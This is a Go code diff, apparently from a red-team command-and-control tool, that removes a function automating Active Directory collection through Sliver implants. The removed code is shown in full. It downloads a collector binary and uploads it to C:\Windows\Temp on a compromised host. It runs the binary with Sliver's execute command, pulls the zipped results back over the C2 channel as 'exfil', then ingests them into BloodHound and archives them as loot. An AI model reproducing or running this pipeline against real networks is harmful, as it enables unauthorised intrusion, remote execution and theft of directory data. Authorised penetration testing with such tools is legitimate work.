@@ -5,8 +5,6 @@ import (
 	"crypto/rand"
 	"encoding/hex"
 	"fmt"
-	"os"
-	"path/filepath"
 	"strings"
 	"sync"
 	"time"
@@ -210,95 +208,6 @@ func (r *CollectionRunner) Start(ctx context.Context, agentID, agentKind, agentO
 
 	go r.pipeline(id, agentID, opts)
 	return id, nil
-}
-
-func (r *CollectionRunner) pipeline(id, agentID string, opts CollectionOptions) {
-	timeout := clampTimeoutSeconds(opts.TimeoutSeconds)
-	ctx, cancel := context.WithTimeout(context.Background(), timeout+30*time.Second)
-	defer cancel()
-
-	fail := func(stage Stage, format string, args ...any) {
-		r.setState(id, StageFailed, "", fmt.Sprintf(format, args...))
-	}
-
-	collector := strings.ToLower(opts.Collector)
-	remoteDir := `C:\Windows\Temp`
-
-	// Running: fetch the collector binary and stage it on the agent.
-	r.setState(id, StageRunning, "downloading collector", "")
-	localCollector, _, err := r.source.Download(ctx, collector, "")
-	if err != nil {
-		fail(StageRunning, "collector download failed: %v", err)
-		return
-	}
-	remoteCollector := filepath.Join(remoteDir, collectorFileName(collector))
-	r.setState(id, StageRunning, "uploading collector", "")
-	if err := r.files.Upload(ctx, agentID, remoteDir, localCollector); err != nil {
-		fail(StageRunning, "collector upload failed: %v", err)
-		return
-	}
-
-	// Collecting: run the collector via the sliver console's execute command.
-	// The "--" is load-bearing: without it pflag strips the collector flags
-	// that follow the binary path. The zipfilename is an absolute remote path
-	// so the artifact lands where the download stage expects it.
-	artifactName := fmt.Sprintf("siren-%s-%s.zip", collector, id)
-	remoteArtifact := filepath.Join(remoteDir, artifactName)
-	cmd := fmt.Sprintf("execute --timeout %d -- %q -c %s --zipfilename %s",
-		int(timeout.Seconds()), remoteCollector, strings.Join(opts.Methods, ","), remoteArtifact)
-	if opts.Domain != "" {
-		cmd += " --domain " + opts.Domain
-	}
-	if len(opts.Flags) > 0 {
-		cmd += " " + strings.Join(opts.Flags, " ")
-	}
-	r.setState(id, StageCollecting, "collector running", "")
-	if _, err := r.run.Run(ctx, agentID, cmd); err != nil {
-		fail(StageCollecting, "collector failed: %v", err)
-		return
-	}
-	time.Sleep(time.Second) // settle for zip finalization
-
-	// Downloading: exfil the artifact.
-	localArtifact := filepath.Join(r.svc.dataDir, "collections", id, artifactName)
-	if err := os.MkdirAll(filepath.Dir(localArtifact), 0o755); err != nil {
-		fail(StageDownloading, "mkdir: %v", err)
-		return
-	}
-	r.setState(id, StageDownloading, "exfil via C2", "")
-	if err := r.files.Download(ctx, agentID, remoteArtifact, localArtifact); err != nil {
-		fail(StageDownloading, "artifact download failed: %v", err)
-		return
-	}
-	data, err := os.ReadFile(localArtifact)
-	if err != nil {
-		fail(StageDownloading, "read artifact: %v", err)
-		return
-	}
-	r.mu.Lock()
-	r.states[id].RemoteArtifact = localArtifact
-	r.mu.Unlock()
-
-	// Ingesting: push to BloodHound, then archive to loot.
-	if opts.Ingest {
-		r.setState(id, StageIngesting, "uploading to BloodHound", "")
-		job, err := r.svc.IngestBytes(ctx, artifactName, "application/zip", data)
-		if err != nil {
-			fail(StageIngesting, "ingest failed: %v", err)
-			return
-		}
-		r.mu.Lock()
-		r.states[id].IngestJobID = job.ID
-		r.mu.Unlock()
-	}
-	if opts.Loot {
-		name := fmt.Sprintf("bloodhound-%s-%d", agentID, time.Now().UnixMilli())
-		if err := r.loot.Archive(ctx, name, data); err != nil {
-			fail(StageDone, "loot archive failed: %v", err)
-			return
-		}
-	}
-	r.setState(id, StageDone, "", "")
 }
 
 // Status returns the current state of a run.
